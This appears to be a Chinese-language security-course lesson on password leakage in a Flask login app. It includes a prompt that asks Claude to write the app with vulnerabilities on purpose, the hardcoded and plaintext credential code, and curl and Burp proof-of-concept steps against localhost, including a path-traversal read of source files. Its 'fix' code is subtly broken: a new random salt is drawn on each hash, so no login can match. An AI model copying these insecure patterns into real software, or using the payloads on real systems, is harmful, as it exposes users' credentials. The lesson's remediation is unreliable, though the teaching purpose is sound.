# Day 2 - 密码泄露漏洞

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带漏洞的登录功能：

```
使用 Flask 生成一个登录页面和首页，要求：
1. 前端用 HTML+CSS 做一个登录框
2. 后端用 Python Flask 处理登录请求
3. 为了方便测试，默认管理员账号密码直接写在代码里
4. 登录成功后在 HTML 页面中显示用户信息（包括密码字段）
5. 在登录页面的 HTML 注释中写上默认账号信息（方便维护）
6. 密码以明文形式存储和比对，不要加密
```

---

## 二、漏洞关键代码解释

### 漏洞 1：硬编码凭据（Hardcoded Credentials）

```python
# core/auth.py
ADMIN_CREDENTIALS = {
    "username": "admin",
    "password": "admin123"  # ← 硬编码密码
}

USERS_DB = {
    "admin": {
        "password": "admin123",   # ← 明文存储
        "role": "admin",
        ...
    }
}
```

**问题**：管理员账号密码直接写在源代码里。任何人能接触到源码（通过 LFI、Git 泄露、源码审计等）即可获取。

### 漏洞 2：明文密码存储

```python
USERS_DB["admin"]["password"] = "admin123"  # 明文！
```

**问题**：密码以明文形式存储在内存/数据库中。一旦数据库泄露，所有用户密码直接暴露。

### 漏洞 3：登录响应泄露密码

```python
def verify_login(username, password):
    if username in USERS_DB:
        if USERS_DB[username]["password"] == password:
            user_data = dict(USERS_DB[username])  # ← 复制了完整用户数据（含密码）
            return {"success": True, "user": user_data}  # ← 密码被返回给前端！
```

**问题**：登录成功后，包含密码字段的完整用户对象被返回到模板中，前端页面渲染时密码会出现在 HTML 中。

### 漏洞 4：HTML 注释泄露

```html
<!--
    默认账号: admin / admin123
-->
```

**问题**：在 HTML 注释中写了默认账号密码，查看页面源码即可获取。

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 安全原则 |
|------|---------|---------|
| 硬编码凭据 | 开发者为方便测试将密码写死在代码里 | 凭据不应出现在源码中 |
| 明文存储 | 未对密码做哈希处理 | 密码必须加盐哈希 |
| 响应泄露 | 直接将数据库对象序列化返回 | 响应中只返回必要字段 |
| 注释泄露 | 调试信息未清理就上线 | 生产环境移除调试信息 |

---

## 四、POC 代码

### POC 1：查看 HTML 注释获取默认账号

```bash
curl http://127.0.0.1:5000/login | grep "<!--"
```

**预期结果**：
```html
<!--
    默认账号: admin / admin123
-->
```

### POC 2：登录后从页面提取密码

```bash
# 登录并查看密码是否出现在页面中
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" | grep "admin123"
```

**预期结果**：页面中包含 `admin123` 密码文本。

### POC 3：利用 LFI 直接读取源码中的凭据

```bash
# 需要项目已包含 Day 6 的文件包含功能
curl "http://127.0.0.1:5000/page?name=../core/auth.py" | grep "ADMIN_CREDENTIALS\|USERS_DB"
```

**预期结果**：返回源码中硬编码的凭据信息。

---

## 五、POC 代码测试方法（Burp Suite）

### 步骤 1：配置 Burp Suite 代理

1. 打开 Burp Suite → Proxy → Proxy Settings
2. 添加监听地址 `127.0.0.1:8080`
3. 浏览器设置代理为 `127.0.0.1:8080`
4. 打开 Intercept（拦截）

### 步骤 2：观察登录请求

1. 浏览器访问 `http://127.0.0.1:5000/login`
2. 输入用户名 `admin`，密码 `admin123`，点击登录
3. Burp 中拦截到 POST 请求，按 **Forward** 放行

### 步骤 3：观察登录响应

1. 在 Burp Suite 中找到该 POST 请求记录
2. 右键 → **Send to Repeater**
3. 切换到 Repeater 标签，点击 **Send**
4. 在 Response 中搜索 `admin123` 或 `password`

### 步骤 4：验证密码泄露

在响应中找到：

```html
<p><strong>密码:</strong> <span class="vuln-highlight">admin123</span></p>
```

证明密码已在响应中泄露。

### 步骤 5：查看 HTML 注释

1. 在 Burp 中访问 `GET /login`
2. 查看 Response 原始 HTML
3. 找到注释部分，确认默认账号信息泄露

---

## 六、POC 代码详细解释

### POC 1 详解

```bash
curl http://127.0.0.1:5000/login | grep "<!--"
```

| 部分 | 含义 |
|------|------|
| `curl` | 命令行 HTTP 请求工具 |
| `http://127.0.0.1:5000/login` | 请求登录页面（GET 方法） |
| `\|` | 管道符，将 curl 的输出传给 grep |
| `grep "<!--"` | 筛选包含 HTML 注释标记 `<!--` 的行 |

**攻击原理**：直接访问登录页面，查看页面源代码中的 HTML 注释。开发者为了方便调试，在注释中写入了默认管理员账号密码。这是最简单的信息泄露方式——不需要任何工具，只需查看页面源码。

### POC 2 详解

```bash
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" | grep "admin123"
```

| 部分 | 含义 |
|------|------|
| `-d` | 发送 POST 请求，附带表单数据 |
| `username=admin&password=admin123` | 登录表单的字段 |
| `grep "admin123"` | 在响应中搜索密码字符串 |

**攻击原理**：正常登录后，服务器将包含密码的用户信息返回到了页面中。攻击者通过浏览器的"查看页面源代码"或抓包工具即可看到密码。这通常发生在开发者为了方便调试，把整个用户对象序列化后传给模板。

### POC 3 详解

```bash
curl "http://127.0.0.1:5000/page?name=../core/auth.py" | grep "ADMIN_CREDENTIALS"
```

| 部分 | 含义 |
|------|------|
| `page?name=../core/auth.py` | 利用 Day 6 的文件包含漏洞，穿越目录读取源码 |
| `../` | 路径穿越，从 pages/ 目录回到项目根目录 |
| `grep "ADMIN_CREDENTIALS"` | 在源码中搜索硬编码的凭据 |

**攻击原理**：结合文件包含漏洞（Day 6），直接从服务器读取包含硬编码密码的源代码。这展示了漏洞组合利用的威力——单个漏洞可能危害有限，组合起来可以造成严重破坏。

---

## 七、修复方案

```python
# fix/auth_fix.py
import hashlib

# 修复 1：使用环境变量配置，不硬编码
import os
ADMIN_USERNAME = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD_HASH = os.environ.get("ADMIN_PASS_HASH", "")

# 修复 2：密码加盐哈希
def hash_password(password):
    salt = os.urandom(16)
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)

# 修复 3：登录响应不返回密码
def verify_login_fixed(username, password):
    user = get_user_from_db(username)
    if user and user.password_hash == hash_password(password):
        return {"success": True, "user": {
            "username": user.username,
            "role": user.role
            # 不返回 password 字段！
        }}
```

---

## 八、课后作业

1. 在 `fix/` 目录下创建 `auth_fix.py`，实现上面三个修复
2. 修改 `app.py` 中的导入，从 `fix.auth_fix` 导入修复后的函数
3. 验证原 POC 无法再获取密码
4. 尝试用 Semgrep 写一条规则检测硬编码密码
